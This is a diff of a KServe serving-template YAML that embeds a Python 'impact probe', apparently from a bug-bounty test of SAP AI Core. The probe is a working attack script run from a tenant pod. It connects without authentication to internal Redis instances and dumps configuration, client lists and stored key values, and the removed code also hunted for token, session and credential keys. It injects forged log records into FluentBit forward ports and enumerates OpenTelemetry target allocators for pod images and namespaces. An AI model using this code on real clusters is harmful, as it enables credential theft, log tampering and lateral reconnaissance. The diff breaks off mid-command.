@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v11
+  name: impact-probe-v12
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v11"
+    scenarios.ai.sap.com/id: "impact-probe-v12"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v11"
-    executables.ai.sap.com/name: "impact-probe-v11"
-    executables.ai.sap.com/description: "Redis + FluentBit probe v11"
+    scenarios.ai.sap.com/name: "impact-probe-v12"
+    executables.ai.sap.com/name: "impact-probe-v12"
+    executables.ai.sap.com/description: "FluentBit inject + OTel TA2 + Redis probe v12"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,13 +28,13 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import socket, time, ssl, json
+            import socket, time, ssl, json, struct
             import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P11] {k}: {str(v)[:8000]}", flush=True)
+                print(f"[P12] {k}: {str(v)[:8000]}", flush=True)
 
-            def http_get(url, headers=None, timeout=8):
+            def http_get(url, headers=None, timeout=10):
                 try:
                     req = urllib.request.Request(url, headers=headers or {})
                     ctx = ssl.create_default_context()
@@ -44,312 +44,267 @@ spec:
                         return r.read().decode(errors="replace"), r.status, dict(r.headers)
                 except urllib.error.HTTPError as e:
                     body = ""
-                    try: body = e.read().decode(errors="replace")[:2000]
+                    try: body = e.read().decode(errors="replace")[:3000]
                     except: pass
                     return f"HTTP_{e.code}:{body}", e.code, {}
                 except Exception as e:
                     return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            # ── REDIS RAW CLIENT ──────────────────────────────────────────────────
+            # ── MSGPACK HELPERS (correct uint32/uint64 support) ───────────────────
+            def mp_str(s):
+                b = s.encode("utf-8")
+                n = len(b)
+                if n <= 31:
+                    return bytes([0xa0 | n]) + b
+                elif n <= 0xffff:
+                    return struct.pack(">BH", 0xda, n) + b
+                else:
+                    return struct.pack(">BI", 0xdb, n) + b
+
+            def mp_uint(n):
+                if n <= 0x7f:
+                    return struct.pack("B", n)
+                elif n <= 0xff:
+                    return struct.pack(">BB", 0xcc, n)
+                elif n <= 0xffff:
+                    return struct.pack(">BH", 0xcd, n)
+                elif n <= 0xffffffff:
+                    return struct.pack(">BI", 0xce, n)
+                else:
+                    return struct.pack(">BQ", 0xcf, n)
+
+            def mp_map(d):
+                n = len(d)
+                hdr = bytes([0x80 | n]) if n <= 15 else struct.pack(">BH", 0xde, n)
+                body = b""
+                for k, v in d.items():
+                    body += mp_str(k) + mp_str(str(v))
+                return hdr + body
+
+            def mp_array(items):
+                n = len(items)
+                hdr = bytes([0x90 | n]) if n <= 15 else struct.pack(">BH", 0xdc, n)
+                return hdr + b"".join(items)
+
+            # ── REDIS CLIENT ──────────────────────────────────────────────────────
             class Redis:
-                def __init__(self, host, port=6379, timeout=6):
+                def __init__(self, host, port=6379, timeout=8):
                     self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     self.s.settimeout(timeout)
                     self.s.connect((host, port))
                     self.buf = b""
 
-                def send(self, *args):
+                def _send(self, *args):
                     cmd = f"*{len(args)}\r\n"
                     for a in args:
                         a = str(a)
                         cmd += f"${len(a)}\r\n{a}\r\n"
                     self.s.sendall(cmd.encode())
 
-                def recv_line(self):
+                def _recv_line(self):
                     while b"\r\n" not in self.buf:
-                        chunk = self.s.recv(4096)
-                        if not chunk:
+                        c = self.s.recv(65536)
+                        if not c:
                             break
-                        self.buf += chunk
+                        self.buf += c
                     line, _, self.buf = self.buf.partition(b"\r\n")
                     return line.decode(errors="replace")
 
-                def read_response(self):
-                    line = self.recv_line()
+                def _read(self):
+                    line = self._recv_line()
                     if not line:
                         return None
-                    t = line[0]
-                    data = line[1:]
-                    if t == '+':   # simple string
-                        return data
-                    elif t == '-': # error
-                        return f"ERR:{data}"
-                    elif t == ':': # integer
-                        return int(data)
-                    elif t == '$': # bulk string
+                    t, data = line[0], line[1:]
+                    if t == '+': return data
+                    if t == '-': return f"ERR:{data}"
+                    if t == ':': return int(data)
+                    if t == '$':
                         n = int(data)
-                        if n == -1:
-                            return None
-                        result = b""
-                        while len(result) < n + 2:
-                            chunk = self.s.recv(n + 2 - len(result))
-                            if not chunk:
-                                break
-                            result += chunk
-                        self.buf = result[n+2:] + self.buf
-                        return result[:n].decode(errors="replace")
-                    elif t == '*': # array
-                        count = int(data)
-                        if count == -1:
-                            return None
-                        return [self.read_response() for _ in range(count)]
+                        if n == -1: return None
+                        out = b""
+                        while len(out) < n + 2:
+                            out += self.s.recv(n + 2 - len(out))
+                        self.buf = out[n+2:] + self.buf
+                        return out[:n].decode(errors="replace")
+                    if t == '*':
+                        c = int(data)
+                        return None if c == -1 else [self._read() for _ in range(c)]
                     return line
 
                 def cmd(self, *args):
-                    self.send(*args)
-                    return self.read_response()
+                    self._send(*args)
+                    return self._read()
 
                 def close(self):
                     try: self.s.close()
                     except: pass
 
-            # ── 1. CONNECT TO REDIS ───────────────────────────────────────────────
-            REDIS_IPS = [
-                "100.109.69.212",   # from Envoy listeners
-            ]
-            # Also check KSM for other Redis ClusterIPs — we'll scan the service CIDR
-            # Additional candidates from Envoy listeners
-            report("---", "=== 1. REDIS CONNECTION + UNAUTHENTICATED ACCESS ===")
+            # ── 1. REDIS AT 100.104.166.183:6379 ─────────────────────────────────
+            report("---", "=== 1. REDIS 100.104.166.183:6379 ===")
+            try:
+                r = Redis("100.104.166.183", 6379, timeout=8)
+                pong = r.cmd("PING")
+                report("REDIS_PING", pong)
 
-            for redis_host in REDIS_IPS:
-                report("REDIS_TARGET", f"{redis_host}:6379")
-                try:
-                    r = Redis(redis_host, 6379, timeout=8)
+                # Try to read INFO regardless of auth
+                info = r.cmd("INFO", "server")
+                report("REDIS_INFO_SERVER", info)
 
-                    # PING
-                    pong = r.cmd("PING")
-                    report("REDIS_PING", pong)
+                info_all = r.cmd("INFO", "all")
+                report("REDIS_INFO_ALL", info_all)
 
-                    # INFO — server version, config, replication
-                    info = r.cmd("INFO", "all")
-                    report("REDIS_INFO_ALL", info)
+                # CONFIG GET
+                cfg = r.cmd("CONFIG", "GET", "*")
+                report("REDIS_CONFIG", str(cfg)[:3000])
 
-                    # CONFIG GET * — may expose requirepass, bind, etc.
-                    cfg = r.cmd("CONFIG", "GET", "*")
-                    report("REDIS_CONFIG_GET_ALL", str(cfg))
+                # CLIENT LIST
+                report("REDIS_CLIENT_LIST", r.cmd("CLIENT", "LIST"))
 
-                    # CLIENT LIST — active connections (may reveal other services using Redis)
-                    clients = r.cmd("CLIENT", "LIST")
-                    report("REDIS_CLIENT_LIST", clients)
-
-                    # DBSIZE per DB
-                    for db in range(16):
+                # Keys across all DBs
+                for db in range(16):
+                    r.cmd("SELECT", db)
+                    sz = r.cmd("DBSIZE")
+                    if sz and isinstance(sz, int) and sz > 0:
+                        report(f"REDIS_DB{db}_SIZE", sz)
                         r.cmd("SELECT", db)
-                        size = r.cmd("DBSIZE")
-                        if size and size > 0:
-                            report(f"REDIS_DB{db}_SIZE", size)
+                        keys = r.cmd("KEYS", "*")
+                        report(f"REDIS_DB{db}_KEYS", keys)
+                        if keys and isinstance(keys, list):
+                            for key in keys[:30]:
+                                try:
+                                    ktype = r.cmd("TYPE", key)
+                                    ttl = r.cmd("TTL", key)
+                                    if ktype == "string":
+                                        val = r.cmd("GET", key)
+                                    elif ktype == "hash":
+                                        val = r.cmd("HGETALL", key)
+                                    elif ktype == "list":
+                                        val = r.cmd("LRANGE", key, "0", "20")
+                                    elif ktype == "set":
+                                        val = r.cmd("SMEMBERS", key)
+                                    else:
+                                        val = "?"
+                                    report(f"REDIS_DB{db}_KEY_{key}", f"[{ktype}] ttl={ttl} {str(val)[:600]}")
+                                except Exception as ke:
+                                    report(f"REDIS_DB{db}_KEY_{key}_ERR", str(ke))
 
-                    # Back to DB 0
-                    r.cmd("SELECT", "0")
-                    size0 = r.cmd("DBSIZE")
-                    report("REDIS_DB0_SIZE", size0)
+                r.close()
+            except ConnectionRefusedError as e:
+                report("REDIS_ERR", f"ECONNREFUSED: {e}")
+            except socket.timeout:
+                report("REDIS_ERR", "ETIMEDOUT")
+            except OSError as e:
+                report("REDIS_ERR", f"OSError {e.errno}: {e}")
+            except Exception as e:
+                import traceback
+                report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:800]}")
 
-                    # KEYS * — dump all keys (cap at 500)
-                    keys = r.cmd("KEYS", "*")
-                    report("REDIS_KEYS_ALL", keys)
+            # ── 2. FLUENTBIT FORWARD INPUT — FIXED MSGPACK ────────────────────────
+            report("---", "=== 2. FLUENTBIT LOG INJECTION (port 24224) ===")
 
-                    if keys and isinstance(keys, list):
-                        report("REDIS_KEY_COUNT", len(keys))
-                        # Sample up to 50 keys with type + value
-                        for key in keys[:50]:
-                            try:
-                                ktype = r.cmd("TYPE", key)
-                                ttl   = r.cmd("TTL", key)
-                                if ktype == "string":
-                                    val = r.cmd("GET", key)
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
-                                elif ktype == "hash":
-                                    val = r.cmd("HGETALL", key)
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
-                                elif ktype == "list":
-                                    val = r.cmd("LRANGE", key, "0", "20")
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
-                                elif ktype == "set":
-                                    val = r.cmd("SMEMBERS", key)
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
-                                elif ktype == "zset":
-                                    val = r.cmd("ZRANGE", key, "0", "20", "WITHSCORES")
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
-                                else:
-                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl}")
-                            except Exception as e:
-                                report(f"REDIS_KEY_{key}_ERR", str(e))
+            def fluent_forward_msg(tag, record):
+                ts = int(time.time())
+                # Entry: [timestamp, record]
+                entry = mp_array([mp_uint(ts), mp_map(record)])
+                # Entries array: [[ts, record]]
+                entries = mp_array([entry])
+                # Full message: [tag, entries, options]
+                msg = mp_array([mp_str(tag), entries, mp_map({})])
+                return msg
 
-                        # Scan all remaining keys for credential/token patterns
-                        interesting = [k for k in keys if any(
-                            x in k.lower() for x in [
-                                "token", "session", "auth", "secret", "cred", "key",
-                                "pass", "jwt", "oauth", "user", "tenant", "cert",
-                                "aws", "s3", "iam", "role", "access"
-                            ]
-                        )]
-                        report("REDIS_INTERESTING_KEYS", interesting)
-                        for key in interesting[:30]:
-                            try:
-                                ktype = r.cmd("TYPE", key)
-                                if ktype == "string":
-                                    val = r.cmd("GET", key)
-                                elif ktype == "hash":
-                                    val = r.cmd("HGETALL", key)
-                                else:
-                                    val = r.cmd("LRANGE", key, "0", "-1") if ktype == "list" else "?"
-                                report(f"REDIS_INTERESTING_{key}", f"[{ktype}] {str(val)[:1000]}")
-                            except Exception as e:
-                                report(f"REDIS_INTERESTING_{key}_ERR", str(e))
-
-                    r.close()
-
-                except ConnectionRefusedError:
-                    report("REDIS_CONNECT", f"ECONNREFUSED — Istio blocks {redis_host}:6379")
-                except socket.timeout:
-                    report("REDIS_CONNECT", f"ETIMEDOUT — {redis_host}:6379")
-                except OSError as e:
-                    report("REDIS_CONNECT", f"OSError {e.errno}: {e}")
-                except Exception as e:
-                    import traceback
-                    report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:500]}")
-
-            # ── 2. REDIS TLS (port 6380) ─────────────────────────────────────────
-            report("---", "=== 2. REDIS TLS (port 6380) ===")
-            for redis_host in REDIS_IPS:
-                try:
-                    raw = socket.create_connection((redis_host, 6380), timeout=5)
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    tls_sock = ctx.wrap_socket(raw, server_hostname=redis_host)
-                    tls_sock.sendall(b"*1\r\n$4\r\nPING\r\n")
-                    resp = tls_sock.recv(64).decode(errors="replace")
-                    report(f"REDIS_TLS_{redis_host}:6380", f"CONNECTED: {resp}")
-                    tls_sock.close()
-                except Exception as e:
-                    report(f"REDIS_TLS_{redis_host}:6380", f"{type(e).__name__}: {e}")
-
-            # ── 3. SCAN SERVICE CIDR FOR MORE REDIS INSTANCES ─────────────────────
-            report("---", "=== 3. SERVICE CIDR REDIS SCAN (100.104-111.x.x:6379) ===")
-            # We know service CIDR is 100.104.0.0/x from Envoy listeners
-            # Scan a targeted set of IPs we know from Envoy listeners
-            candidate_ips = [
-                "100.109.69.212",   # confirmed from Envoy
-                "100.104.7.43",     # Kiali/control plane
-                "100.106.186.136",  # unknown HTTP
-                "100.109.200.238",  # port 8888
-                "100.104.166.183",  # port 8042
+            fb_targets = [
+                "100.64.76.16",
+                "100.64.33.11",
+                "100.109.242.36",
             ]
-            for ip in candidate_ips:
-                for port in [6379, 6380, 6381]:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            record = {
+                "log":    "SAP AI Core security probe: unauthenticated log injection via FluentBit forward input port 24224 from KServe tenant pod",
+                "tenant": "cf-aicore-security-bb-12",
+                "pod":    "impact-probe-v12",
+                "level":  "SECURITY_FINDING",
+                "source": "rce_impact_probe",
+            }
+            for fb_host in fb_targets:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(6)
+                try:
+                    s.connect((fb_host, 24224))
+                    report(f"FLUENTBIT_{fb_host}_TCP", "CONNECTED")
+                    payload = fluent_forward_msg("security.probe.rce", record)
+                    report(f"FLUENTBIT_{fb_host}_PAYLOAD_LEN", len(payload))
+                    s.sendall(payload)
+                    time.sleep(2)
                     s.settimeout(3)
                     try:
-                        s.connect((ip, port))
-                        s.sendall(b"*1\r\n$4\r\nPING\r\n")
-                        data = s.recv(64).decode(errors="replace")
-                        report(f"SCAN_{ip}:{port}", f"OPEN: {data[:100]}")
-                        s.close()
-                    except socket.timeout:
-                        pass  # silent
-                    except ConnectionRefusedError:
-                        pass  # silent
-                    except OSError as e:
-                        if e.errno == 104:  # ECONNRESET = Istio RST
-                            report(f"SCAN_{ip}:{port}", "ECONNRESET (Istio intercept)")
-                    except Exception as e:
-                        pass
-                    finally:
-                        try: s.close()
-                        except: pass
-
-            # ── 4. FLUENTBIT PORT 24224 ───────────────────────────────────────────
-            report("---", "=== 4. FLUENTBIT FORWARD INPUT (port 24224) ===")
-            # FluentBit forward protocol uses msgpack over TCP
-            # Try raw TCP first to see what we get
-            fb_targets = [
-                ("100.64.76.16", 24224),
-                ("100.64.33.11", 24224),
-                ("100.109.242.36", 24224),
-            ]
-            for fb_host, fb_port in fb_targets:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                try:
-                    s.connect((fb_host, fb_port))
-                    report(f"FLUENTBIT_{fb_host}:{fb_port}_TCP", "CONNECTED")
-                    # Send a Fluent Forward protocol message (msgpack)
-                    # Tag: "security.probe", record: {"msg": "probe-v11", "tenant": "bb-12"}
-                    # Fluent Forward format: [tag, [[timestamp, record]], option]
-                    # Use raw msgpack bytes for a minimal message
-                    import struct
-                    # Minimal msgpack array [3 elements]:
-                    # ["security.probe", [[ts, {"injected": "probe-v11"}]], {}]
-                    tag = b"security.probe.rce"
-                    ts  = int(time.time())
-                    # Build msgpack manually (minimal)
-                    def mp_str(s):
-                        b = s.encode()
-                        return bytes([0xa0 | len(b)]) + b if len(b) <= 31 else bytes([0xda, len(b)>>8, len(b)&0xff]) + b
-                    def mp_int(n):
-                        return struct.pack(">B", n) if n < 128 else struct.pack(">BH", 0xcd, n)
-                    def mp_map(d):
-                        r = bytes([0x80 | len(d)])
-                        for k, v in d.items():
-                            r += mp_str(k) + mp_str(v)
-                        return r
-                    entry = bytes([0x92]) + mp_int(ts) + mp_map({"injected": "sap-aicore-rce-probe-v11", "tenant": "bb-12"})
-                    entries = bytes([0x91]) + entry
-                    msg = bytes([0x93]) + mp_str(tag.decode()) + entries + bytes([0x80])
-                    s.sendall(msg)
-                    time.sleep(1)
-                    try:
                         resp = s.recv(256)
-                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", resp.decode(errors="replace")[:200])
+                        report(f"FLUENTBIT_{fb_host}_RESPONSE", f"bytes={len(resp)} {resp[:100]!r}")
                     except socket.timeout:
-                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", "no response (accepted silently)")
+                        report(f"FLUENTBIT_{fb_host}_RESPONSE", "no ACK (accepted silently — normal for forward mode)")
                     s.close()
+                    report(f"FLUENTBIT_{fb_host}_RESULT", "INJECTION SENT")
                 except ConnectionRefusedError:
-                    report(f"FLUENTBIT_{fb_host}:{fb_port}", "ECONNREFUSED (Istio blocks)")
+                    report(f"FLUENTBIT_{fb_host}", "ECONNREFUSED")
                 except OSError as e:
-                    report(f"FLUENTBIT_{fb_host}:{fb_port}", f"OSError {e.errno}: {e}")
+                    if e.errno == 104:
+                        report(f"FLUENTBIT_{fb_host}", "ECONNRESET (Istio)")
+                    else:
+                        report(f"FLUENTBIT_{fb_host}", f"OSError {e.errno}: {e}")
                 except Exception as e:
-                    report(f"FLUENTBIT_{fb_host}:{fb_port}_ERR", f"{type(e).__name__}: {e}")
+                    report(f"FLUENTBIT_{fb_host}_ERR", f"{type(e).__name__}: {e}")
                 finally:
                     try: s.close()
                     except: pass
 
-            # ── 5. UNKNOWN SERVICE 100.106.186.136:80 ────────────────────────────
-            report("---", "=== 5. UNKNOWN HTTP SERVICE (100.106.186.136:80) ===")
-            body, code, hdrs = http_get("http://100.106.186.136:80/", timeout=6)
-            report("UNKNOWN_HTTP_ROOT", f"[{code}] hdrs={dict(list(hdrs.items())[:8])} {body[:500]}")
-            for path in ["/metrics", "/health", "/api", "/api/v1", "/info", "/version",
-                         "/swagger", "/openapi.json", "/.well-known/openid-configuration"]:
-                body, code, hdrs = http_get(f"http://100.106.186.136:80{path}", timeout=5)
-                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
-                    report(f"UNKNOWN_HTTP{path.replace('/','_')}", f"[{code}] {body[:400]}")
+            # ── 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ─────────────
+            report("---", "=== 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ===")
+            TA2 = "http://100.106.186.136:80"
 
-            # ── 6. PORT 20001/20004 (Istio/Kiali control plane) ─────────────────
-            report("---", "=== 6. ISTIO CONTROL PLANE PORTS (100.104.7.43) ===")
-            for port in [20001, 20004, 15010, 15014, 9090, 8080]:
-                body, code, hdrs = http_get(f"http://100.104.7.43:{port}/", timeout=5)
-                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
-                    report(f"KIALI_{port}_root", f"[{code}] {body[:400]}")
-                    # If accessible, try Kiali API
-                    if code == 200:
-                        for kpath in ["/api/namespaces", "/api/config", "/api/istio/config/list",
-                                      "/kiali/api/namespaces"]:
-                            b2, c2, _ = http_get(f"http://100.104.7.43:{port}{kpath}", timeout=5)
-                            if c2 not in (0,):
-                                report(f"KIALI_{port}{kpath.replace('/','_')}", f"[{c2}] {b2[:400]}")
+            body, code, _ = http_get(f"{TA2}/", timeout=8)
+            report("TA2_ROOT", f"[{code}] {body[:500]}")
 
-            report("DONE", "probe v11 complete")
+            # Jobs list
+            body, code, _ = http_get(f"{TA2}/jobs", timeout=10)
+            report("TA2_JOBS", f"[{code}] {body[:3000]}")
+
+            # All job targets
+            body, code, _ = http_get(f"{TA2}/debug/jobs", timeout=10)
+            report("TA2_DEBUG_JOBS", f"[{code}] {body[:3000]}")
+
+            # Scrape configs
+            body, code, _ = http_get(f"{TA2}/debug/scrape_configs", timeout=10)
+            report("TA2_SCRAPE_CONFIGS", f"[{code}] {body[:5000]}")
+
+            # Targets
+            body, code, _ = http_get(f"{TA2}/debug/targets", timeout=10)
+            report("TA2_TARGETS", f"[{code}] {body[:3000]}")
+
+            # Known job paths from other TA
+            for job in ["kubernetes-pods", "kubernetes-nodes", "kubernetes-endpointslices",
+                        "kubernetes-nodes-cadvisor", "kubernetes-service-endpoints"]:
+                body, code, _ = http_get(f"{TA2}/jobs/{job}/targets", timeout=10)
+                if code == 200:
+                    report(f"TA2_JOB_{job}", body[:3000])
+                else:
+                    report(f"TA2_JOB_{job}", f"[{code}] {body[:200]}")
+
+            # ── 4. COMPARE WITH KNOWN OTel TA ────────────────────────────────────
+            report("---", "=== 4. KNOWN OTEL TA JOBS REFRESH ===")
+            TA1 = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
+            body, code, _ = http_get(f"{TA1}/jobs", timeout=10)
+            report("TA1_JOBS", f"[{code}] {body[:2000]}")
+
+            body, code, _ = http_get(f"{TA1}/jobs/kubernetes-pods/targets", timeout=12)
+            if code == 200:
+                # Extract pod IPs and images we haven't seen before
+                import re
+                images = re.findall(r'"__meta_kubernetes_pod_container_image":"([^"]+)"', body)
+                namespaces = re.findall(r'"__meta_kubernetes_namespace":"([^"]+)"', body)
+                unique_images = list(set(images))
+                unique_ns = list(set(namespaces))
+                report("TA1_POD_IMAGES", "\n".join(sorted(unique_images)[:60]))
+                report("TA1_POD_NAMESPACES", "\n".join(sorted(unique_ns)[:40]))
+
+            report("DONE", "probe v12 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
